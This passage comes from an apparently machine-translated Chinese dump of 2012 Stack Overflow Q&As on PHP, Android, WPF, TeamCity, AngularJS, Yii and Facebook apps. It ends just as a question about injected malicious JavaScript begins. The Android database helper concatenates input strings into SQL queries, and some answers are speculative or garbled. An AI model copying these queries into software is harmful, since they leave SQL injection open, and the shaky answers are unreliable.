    public function setEnabled($boolean) {
        $this->_enabled = ($boolean) ? true : false;
        return $this;
    }
}
?> 
```

这是核心代码的默认行为。但是对于这个特定的项目，我需要能够扩展/覆盖该`write`方法，例如使用额外的参数。

**问：**如何更改此 App_Auth_Log 类，使其向后兼容以前调用的项目`App_Log::getInstance()->write`？

我认为它应该如何工作（但不知道该怎么做）。如果`App_Front::getInstance()->hasParam("withAuthLog")`传递一个自定义类名，例如：`My_Custom_Auth_Log`它会覆盖原始的 write 方法。只是不确定如何修改单例部分

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:24:57.020

你没有选择。你*必须*修改你的`App_Log`代码，因为一切都是静态地调用它。对于最小的更改，您可以类并返回`extend`该子类的实例；但这很混乱，因为父母永远不应该知道自己的孩子。`App_Log``App_Log::getInstance`

也许您可以阻止`App_Log`加载的默认实现并从不同的文件加载它的不同实现。不过这也很乱。

这正是单例和静态调用非常不受欢迎的原因之一。请参阅[如何不使用静力学破坏您的可测试性](http://kunststube.net/static/)。

# eclipse - 如果没有任何更改，Eclipse 插件构建不应生成新版本的插件

> ID：13491069
> 
> 赞同：1
> 
> 时间：2012-11-21T10:20:43.520
> 
> 标签：eclipse, maven, jenkins, tycho

下面是我们项目的设置：

1.  项目是一个多模块的maven项目
2.  Maven 和 tycho 用于构建插件
3.  Jenkins 用作 CI 服务器并运行每晚构建。
4.  每个插件清单都包含 1.0.0.qualifier 作为版本号。限定符标记在构建之后被时间戳替换。
5.  Git 作为版本控制系统

有了上面的设置，当夜间构建运行时，插件会得到一个新的版本号，即使插件的源代码没有任何变化。这样做是它产生了很多插件的冗余版本，它当我们将每晚构建的输出作为更新站点提供时，就会成为一个问题。Eclipse 不必要地下载了更新站点中的所有插件，因为时间戳已更改，并且它认为所有这些插件都是新版本，即使以前版本的大多数插件在功能或内容方面没有任何变化。

根据上面的解释，有没有办法防止在夜间构建时生成新版本的插件，可能是通过 Jenkins 中的配置更改或使用 tycho 或 Maven 等中的功能。版本应该自动更新每晚构建已更改的插件（源代码或配置）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:44:34.080

A new feature in Tycho 0.16.0 might help. See [http://wiki.eclipse.org/Tycho/Reproducible_Version_Qualifiers](http://wiki.eclipse.org/Tycho/Reproducible_Version_Qualifiers)

# android - 如何在 android textview 中显示正确的拉丁字符？

> ID：13491074
> 
> 赞同：0
> 
> 时间：2012-11-21T10:20:56.447
> 
> 标签：android, sqlite, character

> **可能重复：**
> [如何在 Android 中显示拉丁词？](https://stackoverflow.com/questions/13452621/how-can-i-display-latin-words-in-android)

我必须从 Sqlite 数据库中获取文本，并且每个特殊的拉丁字符（即 à、ò、ù、è...）都显示为带有“？”的黑色方块。里面。

我怎样才能正确显示这个？

我在下面使用了 DatabaseHelper：

```
public class VocabTesterDatabaseHelper extends SQLiteOpenHelper {

    private static String DB_PATH = "data/data/com.VoacabTester/databases/";

    private static String DB_NAME = "vocabdb.db";

    private SQLiteDatabase vocabDatabase;

    private final Context vocabContext;

    public VocabTesterDatabaseHelper(Context context) {
        super(context, DB_NAME, null, 3);
        this.vocabContext = context;
    }

    public void createDataBase() throws IOException {

        boolean dbExist = checkDataBase();

        if (dbExist) {

        } else {
            this.getReadableDatabase();
            copyDataBase();
        }

    }

    private boolean checkDataBase() {

        File dbFile = new File(DB_PATH + DB_NAME);
        return dbFile.exists();
    }

    private void copyDataBase() throws IOException {
        try {

            InputStream myInput = vocabContext.getAssets().open(DB_NAME);
            String outFileName = DB_PATH + DB_NAME;

            // Open the empty db as the output stream
            OutputStream myOutput = new FileOutputStream(outFileName);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = myInput.read(buffer)) > 0) {
                myOutput.write(buffer, 0, length);
            }

            myOutput.flush();
            myOutput.close();
            myInput.close();
        } catch (IOException e) {
            Log.v("data", e.toString().concat("sql"));
        }
    }

    public void openDataBase() throws SQLException {

        // Open the database
        String myPath = DB_PATH + DB_NAME;
        vocabDatabase = SQLiteDatabase.openDatabase(myPath, null,
                SQLiteDatabase.OPEN_READONLY);

    }

    public Cursor getFoundationTierQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM FoundationTierVocabularyQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    };

    public Cursor getHigherTierQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM HigherTierQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getEasyFirstConjugationVerbs() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM VerbQuestions1stConjugation ORDER BY Random()",
                null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getEasySecondConjugationVerbs() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM VerbQuestions2ndConjugation ORDER BY Random()",
                null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getEasyThirdConjugationVerbs() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM VerbQuestions3rdConjugation ORDER BY Random()",
                null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getEasyFourthConjugationVerbs() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM VerbQuestions4thConjugation ORDER BY Random()",
                null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getEasyMixConjugationVerbs() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM VerbQuestionsallConjugation ORDER BY Random()",
                null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getEasyIrregularConjugationVerbs() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM IrregularVerbsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getFirstDeclensionNounsQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM FirstDeclensionNounsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getSecondDeclensionNounsQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM SecondDeclensionNounsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getThirdDeclensionNounsQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM ThirdDeclensionNounsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getFourthDeclensionNounsQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM FourthDeclensionNounsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getFifthDeclensionNounsQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM FifthDeclensionNounsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getNounsAllDeclensionNounsQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM NounsDeclensionNounsQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getis_ea_idQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IsEaIdQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor gethic_haec_hocQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM HicHaecHocQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getille_illa_illudQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IlleIllaIlludQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getqui_quae_quodQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM QuiQuaeQuodQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getIdem_eadem_idemQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IdemEademIdemQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getipse_ipsa_ipsumQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IpseIpsaIpsumQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getalius_alia_aliudQuestions() {
        Cursor cur;
        cur = vocabDatabase
                .rawQuery(
                        "SELECT * FROM AliusAliaAliudQuestions ORDER BY Random()",
                        null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAdjectiveQuestions() {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM AdjectivesQuestions ORDER BY Random()", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerFirstDeclensionNounsQuestion(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM FirstDeclensionNounsQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getSAnswerecondDeclensionNounsQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM SecondDeclensionNounsQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerThirdDeclensionNounsQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM ThirdDeclensionNounsQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerFourthDeclensionNounsQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM FourthDeclensionNounsQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerFifthDeclensionNounsQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM FifthDeclensionNounsQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerNounsAllDeclensionNounsQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM NounsDeclensionNounsQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnsweris_ea_idQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IsEaIdQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerhic_haec_hocQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM HicHaecHocQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerille_illa_illudQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IlleIllaIlludQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerqui_quae_quodQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM QuiQuaeQuodQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerIdem_eadem_idemQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IdemEademIdemQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnsweripse_ipsa_ipsumQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM IpseIpsaIpsumQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnsweralius_alia_aliudQuestions(String question) {
        Cursor cur;
        cur = vocabDatabase.rawQuery(
                "SELECT * FROM AliusAliaAliudQuestions WHERE Question LIKE '"
                        + question + "'", null);
        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    public Cursor getAnswerAdjectiveQuestions(String question) {
        Cursor cur;

        cur = vocabDatabase.rawQuery(
                "SELECT * FROM AdjectivesQuestions WHERE Question LIKE '"
                        + question + "'", null);

        cur.moveToFirst();
        vocabDatabase.close();
        return cur;
    }

    @Override
    public synchronized void close() {

        if (vocabDatabase != null)
            vocabDatabase.close();

        super.close();

    }

    @Override
    public void onCreate(SQLiteDatabase db) {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }
} 
```

我在下面使用了 Activity 类：

```
public class VocabTesterAdjectiveActivity extends Activity {
    private TextView question;
    private TextView stats;
    private Button skipButton;
    private Button finishButton;

    final VocabTesterDatabaseHelper dbObj = new VocabTesterDatabaseHelper(this);

    Cursor questionCursor;
    Cursor answerCursor;
    Button userAnserButtoon;
    AlertDialog alertDialog;

    String adjectiveNumber;
    String adjectiveCase;
    String adjectiveGender;

    int totalNumberOfQuestions = 0;
    int totalRightQuestions = 0;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.adjective_test);

        question = (TextView) findViewById(R.id.QuestionView);
        stats = (TextView) findViewById(R.id.TotalView);

        skipButton = (Button) findViewById(R.id.skipButton);
        finishButton = (Button) findViewById(R.id.finishButton);
        userAnserButtoon = (Button) findViewById(R.id.enterButton);

        alertDialog = new AlertDialog.Builder(this).create();
        alertDialog.setMessage("No More Questions");
        alertDialog.setTitle("Finish");

        skipButton.setOnClickListener(skipClickListener);
        finishButton.setOnClickListener(finishClickListener);
        userAnserButtoon.setOnClickListener(answerClickListener);

        alertDialog.setButton("OK", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {

            }
        });

        getAllQuestions();
        displayTestQuestion();

    }

    private void displayTestQuestion() {
        resetEverything();
        stats.setText(Integer.toString(totalRightQuestions) + "/"
                + Integer.toString(totalNumberOfQuestions));

        String questionText = questionCursor.getString(0);

        question.setText(questionText);
        //question.setText(Html.fromHtml(questionText));
        adjectiveNumber = questionCursor.getString(1);
        adjectiveCase = questionCursor.getString(3);
        adjectiveGender = questionCursor.getString(2);
    }

    private void resetEverything() {

        RadioGroup adjectiveNumberList = (RadioGroup) findViewById(R.id.adjectiveNumberList);
        adjectiveNumberList.clearCheck();

        RadioGroup adjectiveCaseList = (RadioGroup) findViewById(R.id.adjectiveCaseList);
        adjectiveCaseList.clearCheck();

        RadioGroup adjectiveGenderList = (RadioGroup) findViewById(R.id.adjectiveGenderList);
        adjectiveGenderList.clearCheck();

        userAnserButtoon.getBackground().setColorFilter(Color.GRAY,
                Mode.MULTIPLY);
    }

    private void getAllQuestions() {
        try {
            dbObj.createDataBase();
        } catch (IOException e) {
            e.printStackTrace();
        }

        dbObj.openDataBase();
        questionCursor = dbObj.getAdjectiveQuestions();
    }

    private OnClickListener finishClickListener = new OnClickListener() {
        public void onClick(View v) {
            Intent i = new Intent(VocabTesterAdjectiveActivity.this,
                    VocabTesterHomeActivity.class);
            startActivity(i);
        }
    };

    private OnClickListener skipClickListener = new OnClickListener() {
        public void onClick(View v) {
            if (!questionCursor.isLast()) {
                questionCursor.moveToNext();
                totalNumberOfQuestions++;
                displayTestQuestion();
            } else {
                alertDialog.setMessage("No More Questions");
                alertDialog.show();
            }
        }
    };

    private OnClickListener answerClickListener = new OnClickListener() {
        public void onClick(View v) {
            String useSelectedNumber = "";
            String useSelectedCase = "";
            String useSelectedGender = "";

            RadioGroup adjectiveNumberList = (RadioGroup) findViewById(R.id.adjectiveNumberList);
            int count = adjectiveNumberList.getChildCount();
            for (int i = 0; i < count; i++) {
                View radio = adjectiveNumberList.getChildAt(i);
                if (radio instanceof RadioButton) {
                    if (((RadioButton) radio).isChecked()) {
                        useSelectedNumber = ((String) ((RadioButton) radio)
                                .getText()).toLowerCase();
                        break;
                    }
                }
            }

            RadioGroup adjectiveCaseList = (RadioGroup) findViewById(R.id.adjectiveCaseList);
            count = adjectiveCaseList.getChildCount();
            for (int i = 0; i < count; i++) {
                View radio = adjectiveCaseList.getChildAt(i);
                if (radio instanceof RadioButton) {
                    if (((RadioButton) radio).isChecked()) {
                        useSelectedCase = ((String) ((RadioButton) radio)
                                .getText()).toLowerCase();
                        break;
                    }
                }
            }

            RadioGroup adjectiveGenderList = (RadioGroup) findViewById(R.id.adjectiveGenderList);
            count = adjectiveGenderList.getChildCount();
            for (int i = 0; i < count; i++) {
                View radio = adjectiveGenderList.getChildAt(i);
                if (radio instanceof RadioButton) {
                    if (((RadioButton) radio).isChecked()) {
                        useSelectedGender = ((String) ((RadioButton) radio)
                                .getText()).toLowerCase();
                        break;
                    }
                }
            }

            dbObj.openDataBase();
            answerCursor = dbObj.getAnswerAdjectiveQuestions(questionCursor
                    .getString(0));
            boolean isCorrect = false;

            while (!answerCursor.isLast()) {
                if (useSelectedNumber.equals(answerCursor.getString(1))
                        && useSelectedGender.equals(answerCursor.getString(2))
                        && useSelectedCase.equals(answerCursor.getString(3))) {
                    isCorrect = true;
                    break;
                }
                answerCursor.moveToNext();
            }
            if (useSelectedNumber.equals(answerCursor.getString(1))
                    && useSelectedGender.equals(answerCursor.getString(2))
                    && useSelectedCase.equals(answerCursor.getString(3))) {
                isCorrect = true;
            }
            if (isCorrect) {
                userAnserButtoon.getBackground().setColorFilter(Color.GREEN,
                        Mode.MULTIPLY);
                totalRightQuestions++;
                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    public void run() {
                        if (!questionCursor.isLast()) {
                            questionCursor.moveToNext();
                            totalNumberOfQuestions++;
                            displayTestQuestion();
                        } else {
                            alertDialog.setMessage("No More Questions");
                            alertDialog.show();
                        }
                    }
                }, 1000);

            } else {
                userAnserButtoon.getBackground().setColorFilter(Color.RED,
                        Mode.MULTIPLY);
                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    public void run() {
                        totalNumberOfQuestions++;
                        displayTestQuestion();
                    }
                }, 1000);
            }

        }
    };
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:28:01.870

尝试更改文件编码格式：

`System.setProperty("file.encoding","Latin-1");`

# c# - 将多个 ContextMenu 项目合并为一个

> ID：13491078
> 
> 赞同：0
> 
> 时间：2012-11-21T10:21:01.273
> 
> 标签：c#, wpf

我正在尝试将几个 ContextMenu 项目合并为一个。目前，我正在使用单独的 MenuItem 来工作。有没有一种方法可以将所有这些 MenuItems 组合成一个同时能够在用户单击不同的 MenuItems 时控制这些事件触发器中的每一个？

```
NotifyIcon notifyIcon = new NotifyIcon();
        System.Windows.Forms.ContextMenu contextMenu = new System.Windows.Forms.ContextMenu();

        System.Windows.Forms.MenuItem ChangeDetailsMenu = new System.Windows.Forms.MenuItem();
        ChangeDetailsMenu.Text = "Change Contact Details";
        ChangeDetailsMenu.Click += ChangeContactDetails;

        System.Windows.Forms.MenuItem ChangeKinectAngleMenu = new System.Windows.Forms.MenuItem();
        ChangeKinectAngleMenu.Text = "Change Kinect Angle";
        ChangeKinectAngleMenu.Click += ChangeKinectAngle;

        System.Windows.Forms.MenuItem exitMenu = new System.Windows.Forms.MenuItem();
        exitMenu.Text = "Exit";
        exitMenu.Click += ExitHandler;

        contextMenu.MenuItems.Add(exitMenu);
        contextMenu.MenuItems.Add(ChangeDetailsMenu);
        contextMenu.MenuItems.Add(ChangeKinectAngleMenu);

        Icon icon = new Icon("kse.ico");
        notifyIcon.ContextMenu = contextMenu;
        notifyIcon.Icon = icon;
        notifyIcon.Visible = true;

private void ExitHandler(object sender, EventArgs e)
    {

        notifyIcon.Visible = false;
        System.Windows.Application.Current.Shutdown();
    }

    private void ChangeContactDetails(object sender, EventArgs e)
    {

    }

    private void ChangeKinectAngle(object sender, EventArgs e)
    {

    } 
```

# deployment - 使用 TeamCity 和 MSBuild 自动安装程序部署到远程服务器

> ID：13491084
> 
> 赞同：1
> 
> 时间：2012-11-21T10:21:19.253
> 
> 标签：deployment, msbuild, teamcity-5.1

我有一个编译成一堆 dll 的 .net WPF 项目。我还有另一个项目可以编译所有 dll 并创建一个安装程序 exe。

我还使用 TeamCity 自动为我完成这些任务，只需按一下按钮。

问题是我想要一个单独的 TeamCity 构建配置，旨在自动将结果安装程序 exe 复制到许多远程机器上，每台机器都有特定的凭据。但是，不幸的是，我不知道该怎么做。

我发现了一些关于自动部署的文章（例如[http://www.troyhunt.com/2010/11/you-deploying-it-wrong-teamcity.html](http://www.troyhunt.com/2010/11/you-deploying-it-wrong-teamcity.html)），但显然，它们是针对 web 项目的。

那么，我应该如何在构建时正确部署我的安装程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T20:13:52.737

您最好的选择是研究 NAnt 并执行一项简单的任务，将 TeamCity 工件（安装程序）复制到指定位置。

您需要做的就是在构建安装程序后让 TeamCity 执行指定的 NAnt 任务。

[http://nant.sourceforge.net/release/0.85/help/tasks/copy.html](http://nant.sourceforge.net/release/0.85/help/tasks/copy.html)

**更新**

此外，请查看[此问题](https://stackoverflow.com/questions/5397359/nant-task-copy-unc-with-a-drive-specified-eg-server-c-program-files-blah)以获取有关指定复制任务凭据的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T14:54:16.467

好的，我发现使用 FtpUpload MSBuild 社区任务很容易做到这一点。在那里，可以设置通过 ftp 上传文件（或一组文件）所需的凭据和所有其他内容。

# angularjs - 当涉及到分页时，如何将引导程序与 angularJS 联系起来？

> ID：13491091
> 
> 赞同：2
> 
> 时间：2012-11-21T10:21:35.687
> 
> 标签：angularjs

我的数据库中有数据，我使用调用 httprequestcall 例如：

```
<tr ng-repeat="c in cList.Page.Output.CustomerList.Customer">
<td><a href="#/CustomerSearch/{{c._CustomerKey}}" >{{c._CustomerID}}</a></td>
</tr></table><br/><br/>
<div class="pagination">
  <ul>
    <li class="disabled"><a href="#">Prev</a></li>
    <li><a ng-click="search(1)">1</a></li>
    <li><a ng-click="search(2)">2</a></li>
    <li><a ng-click="search(3)">3</a></li>
    <li><a ng-click="search(4)">4</a></li>
    <li><a ng-click="search(5)">Next</a></li>
  </ul>
</div> 
```

我想要一个解决方案，当我单击下一步时，它应该动态检查 API 本身提供的页码以显示下一组页码，如 1、2、3、4 它应该是 4、5、6， 7

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:31:44.293

您可以使用模板中的数据（就像您使用它来显示您的客户一样）：

```
<ul>
  <li ng-class="{disabled : cList.Page.Number == 1}"><a href="#">Prev</a></li>
  <li><a ng-click="search(1)">{{1*cList.Page.Number}}</a></li>
  <li><a ng-click="search(2)">{{2*cList.Page.Number}}</a></li>
  <li><a ng-click="search(3)">{{3*cList.Page.Number}}</a></li>
  <li><a ng-click="search(4)">{{4*cList.Page.Number}}</a></li>
  <li><a ng-click="search(5)">Next</a></li>
</ul> 
```

（假设页码存储在 cList.Page 中，并从索引 1 开始）

# .net - 确定程序集是在 ASP.NET 还是 Windows 服务中运行

> ID：13491096
> 
> 赞同：1
> 
> 时间：2012-11-21T10:21:55.363
> 
> 标签：.net, vb.net

我编写了一些从 VB.NET Windows 服务和 ASP.NET 项目中引用的 VB.NET DLL。DLL 有一些内置的自定义日志记录功能。

我希望能够从 DLL 代码中确定是从 Windows 服务还是从 ASP.NET 项目调用日志记录函数，以便执行适当的日志记录任务。

关于如何解决的任何提示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:25:21.707

当然，使用`System.Reflection.Assembly.GetEntryAssembly()`你会发现运行当前进程的可执行文件（Assembly）。

我不确定您会发现在 ASP.Net 进程中执行什么（调试以找出答案），但是使用 Windows 服务，您会发现您的服务可执行文件。您可以使用属性 FullName（或名称）检查它

# global-variables - 如何在android中制作全局变量？

> ID：13491109
> 
> 赞同：1
> 
> 时间：2012-11-21T10:22:20.890
> 
> 标签：global-variables

google 后我发现了三种方法： 1\. 静态变量 2\. 扩展 Application 并使用 getApplicationContext 3\. SharedPreferences

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T20:30:59.327

编辑：请阅读评论，我不想删除它，因为它可能会帮助其他陷入同一陷阱的人......

小心静态变量！！我写了一个使用它们的应用程序，但在某些设备上它可以工作，在某些设备上它不能。问题是，如果一个活动编辑该变量，完成并且焦点返回到另一个活动，则无法识别更改。我还没有找到解决方案，不知何故我也没有让它与 getApplicationContext 一起工作......

通常我会说我犯了一个错误，但在这两种情况下，它都在使用 Android 4.0.4 的 SGSII 上工作，但它不在使用 4.1 的 SGSIII 上...... :(

因此，我假设他们已经改变了全局变量的使用，也许是出于安全原因，所以每个活动都有一个自己的变量实例，我不知道

# jquery - 避免在 Yii 中捆绑 jquery

> ID：13491110
> 
> 赞同：2
> 
> 时间：2012-11-21T10:22:24.140
> 
> 标签：jquery, yii

我读了一本名为“Yii Application development cookbook”的书，其中有一章包括以下几行：

> “有时，您需要禁止包含捆绑的 jQuery。例如，如果您的项目代码依赖于特定于版本的功能......”

你能帮我理解以下两个问题吗：

1.  究竟什么是“捆绑的 jQuery”（我的第一个理解是它只是一些使用 jQuery 框架的 javascript 代码。我不确定我是否正确）

2.  作者写“依赖版本特定功能”的目的是什么，他的意思是强制 Yii 应用程序只使用一个版本的 jQuery 并且如果它过时不升级到最新版本？

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:43:46.017

1) Yii 附带了一个默认的 jQuery 版本，他指的是捆绑的 jQuery，jQuery 的实际“版本”（1.2、1.3...1.7、1.8 等），而不仅仅是一些使用它的代码。因此，当您在默认 Yii 安装中调用 jQuery 时，Yii 将启动与其捆绑的 jQuery 版本，这可能不一定是最新的 jQuery 版本，这取决于您拥有的 Yii 版本以及与该 Yii 捆绑的 jQuery 版本版本。

( 1.7）并使用您指定的版本（本例中为 1.8）。

# php - 脸书权限未更新

> ID：13491111
> 
> 赞同：0
> 
> 时间：2012-11-21T10:22:27.137
> 
> 标签：php, facebook, permissions

我正在为我的网站开发一个 facebook 应用程序。我已经更新了权限并保存了。但是我所做的更改没有更新。它显示“更改已保存。请注意，您的更改可能需要几分钟才能传播到所有服务器。” 当我保存更改时。但是我在进行更改后 1 小时测试时获得了旧权限。“预览登录对话框”显示了另一个设置

![在此处输入图像描述](../Images/66bb933937896b5cd681781bd75d06d2.png)

上图显示了测试时的权限页面

![在此处输入图像描述](../Images/4a9c7f3889dbae570a75d74222d71196.png)

此图像是登录权限，授予权限如下所示

![在此处输入图像描述](../Images/409bcef07362a1ce70d1be73afbdc4fe.png) 所有图像都显示不同的权限。这会是什么问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T13:26:29.790

我强烈建议您不要使用 Authenticated Referrals，因为 facebook 宣布他们将在 2013 年 2 月 6 日停止使用它。而是通过 JS SDK 或 PHP SDK 指定权限。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-21T15:07:25.390

感谢 Saber Kordestanchi

所做的更改会在一段时间内更新，但实际问题不在这里，有可能显示不需要的权限。另外，我通过 PHP SDK 指定了权限，所以 fb 显示了这个权限。所以我在代码中添加了所需的权限

```
$params = array('scope' =>'email,friends_photos,publish_stream,photo_upload',
                          'redirect_uri' => 'http://abcd.in/in.php');
$loginUrl = $facebook->getLoginUrl($params); 
```

# javascript - 恶意 javascript 注入 (Hostads.cn)

> ID：13491118
> 
> 赞同：0
> 
> 时间：2012-11-21T10:22:45.937
> 
> 标签：javascript, html, malware

我的网站似乎被黑了，或者发现了一个漏洞，所以现在每次我加载某些页面时，都会注入以下 javascript 和 iframe：

```
<script language="JavaScript" type="text/javascript">
